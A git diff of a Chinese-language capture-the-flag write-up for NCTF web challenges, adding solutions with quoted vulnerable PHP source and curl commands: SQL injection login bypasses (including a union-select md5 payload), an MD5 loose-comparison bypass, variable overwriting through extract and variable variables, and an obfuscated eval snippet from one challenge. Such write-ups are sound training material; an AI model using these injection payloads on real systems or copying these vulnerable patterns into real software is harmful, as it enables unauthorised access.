@@ -49,10 +49,51 @@ javascript里也存在类似的问题，区别在于如果两个都是字符串�
 
 需要修改输入框的maxlength。
 
+## [单身二十年](http://chinalover.sinaapp.com/web8/)
+
+```shell
+curl http://chinalover.sinaapp.com/web8/search_key.php
+```
+
+这个页面通过`window.location`让浏览器加载另一个url了，所以不能马上看到答案。
+
+```html
+<script>window.location="./no_key_is_here_forever.php"; </script>
+key is : nctf{yougotit_script_now}
+```
+
+### Notes
+
+- [`window.location`](https://developer.mozilla.org/en-US/docs/Web/API/Window/location)
 
 ## [单身一百年也没用](http://chinalover.sinaapp.com/web9/)
 
-flag在响应的header里面。
+flag在响应的header里面，而且点击找key的连接会302。
+
+## php decode
+```php
+# Source
+<?php
+function CLsI($ZzvSWE) {
+ 
+    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));
+ 
+    for ($i = 0; $i < strlen($ZzvSWE); $i++) {
+ 
+        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
+ 
+    }
+ 
+    return $ZzvSWE;
+ 
+}
+eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));
+?>
+```
+
+
+貌似执行一下就可以了；解码之后的内容是`phpinfo();flag:nctf{...}`。暂时不清楚这段编码的作用。
+
 
 ## [Cookie](http://chinalover.sinaapp.com/web10/index.php)
 
@@ -122,7 +163,7 @@ curl http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?
 ## [bypass again](http://chinalover.sinaapp.com/web17/index.php)
 
 ```php
-# Sources
+# Source
 if (isset($_GET['a']) and isset($_GET['b'])) {
 if ($_GET['a'] != $_GET['b'])
 if (md5($_GET['a']) == md5($_GET['b']))
@@ -139,7 +180,7 @@ curl 'http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&&b=s214587387a'
 ## [变量覆盖](http://chinalover.sinaapp.com/web18/index.php)
 
 ```html
-<!-- Sources -->
+<!-- Source -->
 <?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?>
   <?php
   extract($_POST);
@@ -164,7 +205,7 @@ curl 'http://chinalover.sinaapp.com/web18/' -X POST -d 'pass=kke&thepassword_123
 不看源代码试不出来
 
 ```php
-# Sources
+# Source
 if($_POST[user] && $_POST[pass]) {
     mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
   mysql_select_db(SAE_MYSQL_DB);
@@ -190,3 +231,58 @@ curl http://chinalover.sinaapp.com/index.php -X POST -d 'user=admin%27%29+--+k&p
 ### Notes
 
 - [comments in MySQL](https://stackoverflow.com/a/14436098/8706476): `--` followed by space characters
+  - append additional characters in case of `trim`
+
+## [SQL注入2](http://4.chinalover.sinaapp.com/web6/index.php)
+
+```php
+# Source
+if($_POST[user] && $_POST[pass]) {
+   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $user = $_POST[user];
+  $pass = md5($_POST[pass]);
+  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
+  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
+      echo "<p>Logged in! Key: ntcf{**************} </p>";
+  }
+  else {
+    echo("<p>Log in failure!</p>");
+  }
+}
+```
+让第一个字句返回结果为空，然后才能用上第二个字句的结果
+```shell
+curl http://4.chinalover.sinaapp.com/web6/index.php -X POST -d 'user=1%27+union+select+md5%28%2725252%27%29+--+m&pass=25252'
+```
+
+### Notes
+
+- php [`mysql_fetch_array`](https://www.php.net/manual/en/function.mysql-fetch-array.php): Fetch **a** result row 
+
+
+<!-- ## [file_get_contents](http://chinalover.sinaapp.com/web23/)
+
+```shell
+echo -n meizijiu > temp.txt
+
+``` -->
+
+## [变量覆盖](http://chinalover.sinaapp.com/web24/)
+
+响应里面的注释有提示
+```html
+<!--foreach($_GET as $key => $value){  
+        $$key = $value;  
+}  
+if($name == "meizijiu233"){
+    echo $flag;
+}-->
+```
+
+```shell
+curl http://chinalover.sinaapp.com/web24/?name=meizijiu233
+```
+
+### Notes
+- php [variable variable](https://www.php.net/manual/en/language.variables.variable.php)
